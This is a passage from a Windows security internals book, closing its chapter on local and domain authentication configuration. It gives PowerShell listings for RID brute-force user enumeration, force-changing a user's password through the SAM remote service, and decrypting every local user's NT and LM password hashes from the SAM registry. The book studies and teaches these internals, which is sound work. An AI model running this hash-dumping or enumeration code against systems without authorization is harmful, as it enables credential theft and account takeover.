<p class="TX">Next, we open the policy object and request <samp class="SANS_TheSansMonoCd_W5Regular_11">LookupNames</samp> access <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. We need to look up the SID for the domain by using its simple name <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. With the domain SID, we can create relative SIDs for each RID we want to brute-force and look up their names <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>. If the returned object’s <samp class="SANS_TheSansMonoCd_W5Regular_11">NameUse</samp> property is set to <samp class="SANS_TheSansMonoCd_W5Regular_11">Unknown</samp>, then the SID didn’t map to a username <span aria-label="annotation5" class="CodeAnnotationCode">❺</span>. By checking this property, we can filter out invalid users from our enumeration.</p>
<p class="TX">Finally, we test this function on another system on our local domain network <span aria-label="annotation6" class="CodeAnnotationCode">❻</span>. You need to be able to authenticate to the server to perform the attack. On a domain-joined system, this should be a given. However, if your machine is a stand-alone system, the attack might fail without authentication credentials.</p>
</section>
<section aria-labelledby="sec31" epub:type="division">
<h4 class="H2" id="sec31"><span id="h2-103"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Forcing a User‘s Password Change</samp></h4>
<p class="TNI1">In the discussion of user objects in the SAM database, I mentioned that if a caller is granted <samp class="SANS_TheSansMonoCd_W5Regular_11">ForcePasswordChange</samp> access on a user object they can force a change of the user’s password. <a href="chapter10.xhtml#Lis10-38">Listing 10-38</a> shows how to do this using the commands described in this chapter.</p>
<span id="Lis10-38"></span><pre><code>PS&gt; <b>function Get-UserObject([string]$Server, [string]$User) {</b>
<b>     Use-NtObject($sam = Connect-SamServer -ServerName $Server) {</b>
<b>         Use-NtObject($domain = Get-SamDomain -Server $sam -User) {</b>
<b>             Get-SamUser -Domain $domain -Name $User -Access ForcePasswordChange</b>
<b>          }</b>
<b>      }</b>
<b>}</b>

PS&gt; <b>function Set-UserPassword([string]$Server, [string]$User, [bool]$Expired) {</b>
<b>     Use-NtObject($user_obj = Get-UserObject $Server $User) {</b>
<b>         $pwd = Read-Host -AsSecureString -Prompt "New Password"</b>
<b>         $user_obj.SetPassword($pwd, $Expired)</b>
<b>     }</b>
<b>}</b>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-38: Force-changing a user’s password via the SAM remote service</span></p>
<p class="TX">We first define a helper function that opens a user object on a specified server. We open the user domain using the <samp class="SANS_TheSansMonoCd_W5Regular_11">User</samp> parameter and explicitly request the <samp class="SANS_TheSansMonoCd_W5Regular_11">ForcePasswordChange</samp> access right, which will generate an access denied error if it’s not granted.</p>
<p class="TX">We then define a function that sets the password. We’ll read the password from the console, as it needs to be in the secure string format. The <samp class="SANS_TheSansMonoCd_W5Regular_11">Expired</samp> parameter marks the password as needing to be changed the next <span aria-label=" Page 338. " epub:type="pagebreak" id="pg_338" role="doc-pagebreak"></span>time the user authenticates. After reading the password from the console, we call the <samp class="SANS_TheSansMonoCd_W5Regular_11">SetPassword</samp> function on the user object.</p>
<p class="TX">We can test the password setting function by running the script in <a href="chapter10.xhtml#Lis10-39">Listing 10-39</a> as an administrator.</p>
<span id="Lis10-39"></span><pre><code>PS&gt; <b>Set-UserPassword -Server $env:COMPUTERNAME "user"</b>
New Password: <b>*********</b>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-39: Setting a user’s password on the current computer</span></p>
<p class="TX">To be granted <samp class="SANS_TheSansMonoCd_W5Regular_11">ForcePasswordChange</samp> access, you need to be an administrator on the target machine. In this case, we’re running as an administrator locally. If you want to change a remote user’s password, however, you’ll need to authenticate as an administrator on the remote computer.</p>
</section>
<section aria-labelledby="sec32" epub:type="division">
<h4 class="H2" id="sec32"><span id="h2-104"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Extracting All Local User Hashes</samp></h4>
<p class="TNI1">In <span class="Xref">“Accessing the SAM Database Through the Registry” on page 325</span>, we defined functions to decrypt a user’s password hash from the SAM database. To use those functions to decrypt the passwords for all local users automatically, run <a href="chapter10.xhtml#Lis10-40">Listing 10-40</a> as an administrator.</p>
<span id="Lis10-40"></span><pre><code><span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>function Get-PasswordHash {</b>
<b>    param(</b>
<b>        [byte[]]$Pek,</b>
<b>        $Key,</b>
<b>        $Rid,</b>
<b>        [switch]$LmHash</b>
<b>    )</b>
<b>    $index = 14</b>
<b>    $type = 2</b>
<b>    if ($LmHash) {</b>
<b>        $index = 13</b>
<b>        $type = 1</b>
<b>    }</b>
<b>    $hash_enc = Get-VariableAttribute $key -Index $Index</b>
<b>    if ($null -eq $hash_enc) {</b>
<b>        return @()</b>
<b>    }</b>
<b>    $hash_dec = Unprotect-PasswordHash -Key $Pek -Data $hash_enc -Rid $Rid</b>
<b>-Type $type</b>
<b>    if ($hash_dec.Length -gt 0) {</b>
<b>        Unprotect-PasswordHashDES -Hash $hash_dec -Rid $Rid</b>
<b>    }</b>
<b>}</b>

<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> PS&gt; <b>function Get-UserHashes {</b>
<b>    param(</b>
<b>        [Parameter(Mandatory)]</b>
<b>        [byte[]]$Pek,</b>
<b>        [Parameter(Mandatory, ValueFromPipeline)]</b>
<b>        $Key</b>
<b>    )</b>

<span aria-label=" Page 339. " epub:type="pagebreak" id="pg_339" role="doc-pagebreak"></span><b>    PROCESS {</b>
<b>        try {</b>
<b>            if ($null -eq $Key["V"]) {</b>
<b>                return</b>
<b>            }</b>
<b>            $rid = [int]::Parse($Key.Name, "HexNumber")</b>
<b>            </b><b>$name = Get-VariableAttribute $key -Index 1</b>

<b>            [PSCustomObject]@{</b>
<b>                Name=[System.Text.Encoding]::Unicode.GetString($name)</b>
<b>                LmHash = Get-PasswordHash $Pek $key $rid -LmHash</b>
<b>                NtHash = Get-PasswordHash $Pek $key $rid</b>
<b>                Rid = $rid</b>
<b>            }</b>
<b>        } catch {</b>
<b>            Write-Error $_</b>
<b>        }</b>
<b>    }</b>
<b>}</b>

<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> PS&gt; <b>$pek = Unprotect-PasswordEncryptionKey</b>
<span aria-label="annotation4" class="CodeAnnotationHang1">❹</span> PS&gt; <b>ls "SEC:\SAM\SAM\Domains\Account\Users" | Get-UserHashes $pek</b>
Name<b>               </b>LmHash NtHash                  Rid
----<b>               </b>------ ------                  ---
Administrator                                     500
Guest                                             501
DefaultAccount                                    503
WDAGUtilityAccount        {125, 218, 222, 22...}  504
admin                     {81, 26, 59, 38...}     1001
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-40: Decrypting the password hashes of all local users</span></p>
<p class="TX">We start by defining a function to decrypt a single password hash from a user’s registry key <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. We select which hash to extract based on the <samp class="SANS_TheSansMonoCd_W5Regular_11">LmHash</samp> parameter, which changes the index and the type for the RC4 key. We then call this function from the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-UserHashes</samp> function <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>, which extracts other information, such as the name of the user, and builds a custom object.</p>
<p class="TX">To use the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-UserHashes</samp> function, we first decrypt the password encryption key <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>, then enumerate the user accounts in the registry and pipe them through it <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>. We can see in the output that only two users have NT password hashes, and no user has an LM hash configured.</p>
</section>
</section>
<section aria-labelledby="sec33" epub:type="division">
<h3 class="H1" id="sec33"><span id="h1-80"></span><samp class="SANS_Futura_Std_Bold_B_11">Wrapping Up</samp></h3>
<p class="TNI1">We started this chapter with a discussion of Windows domain authentication. We went through the various levels of complexity, starting with a local domain on a stand-alone computer and moving through a networked domain and a forest. Each level of complexity has an associated configuration that can be accessed to determine what users and/or groups are available within an authentication domain.</p>
<p class="TX"><span aria-label=" Page 340. " epub:type="pagebreak" id="pg_340" role="doc-pagebreak"></span>Following that, we examined various built-in PowerShell commands you can use to inspect the authentication configuration on the local system. For example, the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LocalUser</samp> command will list all registered users, as well as whether they’re enabled or not. We also saw how to add new users and groups.</p>
<p class="TX">We then looked at the LSA policy, which is used to configure various security properties (such as the audit policy described in <span class="Xref"><a href="chapter9.xhtml">Chapter 9</a></span>), what privileges a user is assigned, and what types of authentication the user can perform.</p>
<p class="TX">Next, we explored how to access the configuration internally, whether locally or on a remote system, using the SAM remote service and domain policy service network protocols. As you saw, what we normally consider a group is referred to as an alias internally.</p>
<p class="TX">We finished the chapter with a deep dive into how the authentication configuration is stored inside the registry and how you can perform a basic inspection of it. We also looked at an example of how to extract a user’s hashed password from the registry.</p>
<p class="TX">In the next chapter, we’ll take a similar look at how the authentication configuration is stored in an Active Directory configuration, which is significantly more complex than the local configuration case.</p>
</section>
</section>
</div></body>
</html>